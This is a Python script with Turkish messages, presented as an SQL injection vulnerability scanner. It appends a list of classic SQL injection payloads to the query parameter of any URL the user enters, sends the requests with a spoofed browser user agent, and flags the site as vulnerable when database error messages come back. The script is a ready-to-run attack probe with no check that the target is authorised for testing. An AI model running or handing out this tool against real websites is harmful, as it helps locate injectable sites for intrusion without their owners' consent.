import sys
import urllib.parse
import urllib.request

PAYLOADLAR = ["'", "' OR '1'='1", '" OR "1"="1', "') OR ('1'='1", "admin' --"]

def banner():
    print("""
 ███████╗ ██████╗ ██╗      ███╗   ███╗  █████╗  ██████╗ 
██╔════╝██╔═══██╗██║      ████╗ ████║ ██╔══██╗ ██╔══██╗
███████╗██║   ██║██║      ██╔████╔██║ ███████║ ██████╔╝
╚════██║██║   ██║██║      ██║╚██╔╝██║ ██╔══██║ ██╔═══╝ 
███████║╚██████╔╝███████╗ ██║ ╚═╝ ██║ ██║  ██║ ██║     
╚══════╝ ╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═╝  ╚═╝ ╚═╝     
          [ SQL Injection Vulnerability Scanner ]
          [           GitHub: Counc             ]
""")

def sql_tara():
    banner()
    hedef_url = input("Test edilecek URL'yi girin (Örn: http://site.com/index.php?id=1): ")
    
    if "=" not in hedef_url:
        print("[!] Hata: URL bir parametre içermelidir (Örn: ?id=1)")
        return

    print("[*] Hedef analiz ediliyor ve payload'lar deneniyor...\n")
    
    ana_url, parametre = hedef_url.split("?")
    param_adi, orijinal_deger = parametre.split("=")[0], parametre.split("=")[1]
    
    acik_bulundu = False
    
    for payload in PAYLOADLAR:
        test_degeri = orijinal_deger + urllib.parse.quote(payload)
        test_url = f"{ana_url}?{param_adi}={test_degeri}"
        
        try:
            req = urllib.request.Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
            response = urllib.request.urlopen(req, timeout=5)
            sayfa_icerigi = response.read().decode('utf-8', errors='ignore').lower()
            
            sql_hatalari = ["sql syntax", "mysql", "syntax error", "unclosed quotation mark", "odbc", "sqlite", "postgresql"]
            hata_var_mi = any(hata in sayfa_icerigi for hata in sql_hatalari)
            
            if hata_var_mi:
                print(f"[!] SQL AÇIĞI RİSKİ TESPİT EDİLDİ!\n    Payload : {payload}\n    Test URL: {test_url}\n")
                acik_bulundu = True
            else:
                print(f"[-] Güvenli görünüyor (Payload: {payload})")
                
        except Exception as e:
            print(f"[!] Bağlantı hatası: {e}")

    print("\n--- Tarama Tamamlandı ---")
    if not acik_bulundu:
        print("[+] Test edilen payload'lara göre bariz bir SQL hatası yakalanamadı.")

if __name__ == "__main__":
    sql_tara()
  
